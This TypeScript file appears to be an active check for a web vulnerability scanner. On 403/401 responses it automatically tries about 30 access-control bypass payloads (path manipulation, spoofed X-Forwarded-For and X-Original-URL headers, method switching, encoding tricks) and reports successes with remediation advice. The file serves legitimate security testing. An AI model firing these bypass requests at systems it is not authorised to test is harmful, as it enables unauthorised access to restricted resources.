import { continueWith, defineCheck, done, Severity } from "engine";
import { Tags } from "../../types";
import { keyStrategy } from "../../utils/key";

/**
 * 403 Forbidden Bypass Detection
 * Inspired by Caido403Bypasser — automated bypass attempts on 403 responses.
 *
 * Tests 25+ techniques across 5 categories:
 * 1. PATH MANIPULATION: /%2e/path, /./path, path..;/, path%00, //path
 * 2. HEADER INJECTION: X-Original-URL, X-Forwarded-For, X-Custom-IP-Authorization
 * 3. METHOD CHANGES: GET→POST, PUT, PATCH, TRACE, OPTIONS
 * 4. ENCODING TRICKS: double encoding, unicode, case variations
 * 5. EXTENSION APPENDING: .json, .html, .php, %20, %09, /
 *
 * Only runs on 403/401 responses. Reports when ANY technique returns 200/302.
 */

type State = {
  testIndex: number;
  originalPath: string;
  originalMethod: string;
  originalCode: number;
};

type BypassTest = {
  name: string;
  category: string;
  apply: (spec: any, originalPath: string, originalMethod: string) => void;
};

function getBody(resp: any): string {
  try { return resp?.getBody?.()?.toText?.() ?? ""; } catch { return ""; }
}

function buildTests(originalPath: string): BypassTest[] {
  const path = originalPath || "/";
  const pathParts = path.split("/").filter(Boolean);
  const lastSegment = pathParts[pathParts.length - 1] || "";
  const parentPath = "/" + pathParts.slice(0, -1).join("/");

  const tests: BypassTest[] = [
    // ── PATH MANIPULATION ──
    { name: "/%2e/ prefix", category: "Path", apply: (s) => s.setPath("/%2e" + path) },
    { name: "/. prefix", category: "Path", apply: (s) => s.setPath("/." + path) },
    { name: "// prefix", category: "Path", apply: (s) => s.setPath("/" + path) },
    { name: "..;/ suffix (Tomcat bypass)", category: "Path", apply: (s) => s.setPath(parentPath + "/..;/" + lastSegment) },
    { name: "..%3b/ suffix", category: "Path", apply: (s) => s.setPath(parentPath + "/..%3b/" + lastSegment) },
    { name: "Trailing /", category: "Path", apply: (s) => s.setPath(path.endsWith("/") ? path.slice(0, -1) : path + "/") },
    { name: "Trailing /.", category: "Path", apply: (s) => s.setPath(path + "/.") },
    { name: "Trailing %20", category: "Path", apply: (s) => s.setPath(path + "%20") },
    { name: "Trailing %09", category: "Path", apply: (s) => s.setPath(path + "%09") },
    { name: "Trailing %00 (null byte)", category: "Path", apply: (s) => s.setPath(path + "%00") },
    { name: "Trailing ?", category: "Path", apply: (s) => { s.setPath(path); s.setQuery(""); } },
    { name: "Trailing #", category: "Path", apply: (s) => s.setPath(path + "%23") },
    { name: "Case variation (UPPER)", category: "Path", apply: (s) => s.setPath(path.toUpperCase()) },
    { name: "Case variation (lower)", category: "Path", apply: (s) => s.setPath(path.toLowerCase()) },

    // ── HEADER INJECTION ──
    { name: "X-Original-URL", category: "Header", apply: (s) => { s.setPath("/"); s.setHeader("X-Original-URL", path); } },
    { name: "X-Rewrite-URL", category: "Header", apply: (s) => { s.setPath("/"); s.setHeader("X-Rewrite-URL", path); } },
    { name: "X-Forwarded-For: 127.0.0.1", category: "Header", apply: (s) => s.setHeader("X-Forwarded-For", "127.0.0.1") },
    { name: "X-Custom-IP-Authorization: 127.0.0.1", category: "Header", apply: (s) => s.setHeader("X-Custom-IP-Authorization", "127.0.0.1") },
    { name: "X-Real-IP: 127.0.0.1", category: "Header", apply: (s) => s.setHeader("X-Real-IP", "127.0.0.1") },
    { name: "X-Forwarded-Host: localhost", category: "Header", apply: (s) => s.setHeader("X-Forwarded-Host", "localhost") },
    { name: "X-Host: localhost", category: "Header", apply: (s) => s.setHeader("X-Host", "localhost") },
    { name: "Content-Length: 0 + POST", category: "Header", apply: (s) => { s.setMethod("POST"); s.setHeader("Content-Length", "0"); } },

    // ── METHOD CHANGES ──
    { name: "POST instead of GET", category: "Method", apply: (s) => s.setMethod("POST") },
    { name: "PUT method", category: "Method", apply: (s) => s.setMethod("PUT") },
    { name: "PATCH method", category: "Method", apply: (s) => s.setMethod("PATCH") },

    // ── EXTENSION APPENDING ──
    { name: ".json extension", category: "Extension", apply: (s) => s.setPath(path + ".json") },
    { name: ".html extension", category: "Extension", apply: (s) => s.setPath(path + ".html") },
    { name: ".php extension", category: "Extension", apply: (s) => s.setPath(path + ".php") },
    { name: ";.js suffix (IIS bypass)", category: "Extension", apply: (s) => s.setPath(path + ";.js") },

    // ── ENCODING TRICKS ──
    { name: "Double URL encoding", category: "Encoding", apply: (s) => s.setPath(path.replace(/\//g, "%252f")) },
    { name: "Unicode / → %ef%bc%8f", category: "Encoding", apply: (s) => s.setPath(path.replace(/\//g, "%ef%bc%8f")) },
  ];

  return tests;
}

export default defineCheck<State>(({ step }) => {
  step("setup", (state, ctx) => {
    const code = ctx.target.response?.getCode?.() ?? 0;
    // Only run on 403/401 responses
    if (code !== 403 && code !== 401) return done({ state });

    const originalPath = ctx.target.request.getPath() ?? "/";
    const originalMethod = ctx.target.request.getMethod() ?? "GET";

    return continueWith({
      nextStep: "test",
      state: { testIndex: 0, originalPath, originalMethod, originalCode: code },
    });
  });

  step("test", async (state, ctx) => {
    const tests = buildTests(state.originalPath);
    if (state.testIndex >= tests.length) return done({ state });

    const test = tests[state.testIndex]!;
    try {
      const spec = ctx.target.request.toSpec();
      test.apply(spec, state.originalPath, state.originalMethod);

      const { request, response } = await ctx.sdk.requests.send(spec);
      const code = response?.getCode?.() ?? 0;
      const body = getBody(response);

      // Success: 200 or 302 redirect to non-login page
      const isSuccess = code === 200 && body.length > 100;
      const isRedirect = (code === 301 || code === 302) &&
        !/(login|signin|auth|unauthorized)/i.test(response?.getHeader?.("location")?.[0] ?? "");

      if (isSuccess || isRedirect) {
        // Verify it's not the same error page
        const isErrorPage = /forbidden|access denied|not authorized|401|403/i.test(body.slice(0, 500));
        if (!isErrorPage) {
          return continueWith({
            nextStep: "test",
            state: { ...state, testIndex: state.testIndex + 1 },
            findings: [{
              name: `403 Bypass: ${test.name}`,
              description:
                `The ${state.originalCode} response on \`${state.originalPath}\` was bypassed using the **${test.name}** technique (${test.category}).\n\n` +
                `**Original:** \`${state.originalMethod} ${state.originalPath}\` → ${state.originalCode}\n` +
                `**Bypass:** → ${code}${isRedirect ? ` (redirect to ${response?.getHeader?.("location")?.[0] ?? "unknown"})` : ` (${body.length} bytes)`}\n\n` +
                `**Impact:** Access control bypass — the server incorrectly allows access to a resource that should be forbidden. ` +
                `This may expose admin panels, internal APIs, sensitive data, or debug endpoints.\n\n` +
                `**Recommendation:** Fix the access control at the application layer, not just at the web server/reverse proxy level.`,
              severity: Severity.HIGH,
              correlation: { requestID: request.getId(), locations: [] },
            }],
          });
        }
      }
    } catch {}

    return continueWith({ nextStep: "test", state: { ...state, testIndex: state.testIndex + 1 } });
  });

  return {
    metadata: {
      id: "forbidden-bypass",
      name: "403 Forbidden Bypass",
      description:
        "Automatically attempts 30+ bypass techniques on 403/401 responses: " +
        "path manipulation (/%2e/, ..;/, %00), header injection (X-Original-URL, X-Forwarded-For), " +
        "method changes (POST/PUT/PATCH), encoding tricks, and extension appending (.json, .html, ;.js).",
      type: "active",
      tags: [Tags.BROKEN_ACCESS_CONTROL, Tags.BYPASS],
      severities: [Severity.HIGH],
      aggressivity: { minRequests: 0, maxRequests: 32 },
    },
    initState: (): State => ({ testIndex: 0, originalPath: "/", originalMethod: "GET", originalCode: 403 }),
    dedupeKey: keyStrategy().withMethod().withHost().withPort().withPath().build(),
    when: (t) => {
      const code = t.response?.getCode?.() ?? 0;
      return code === 403 || code === 401;
    },
  };
});
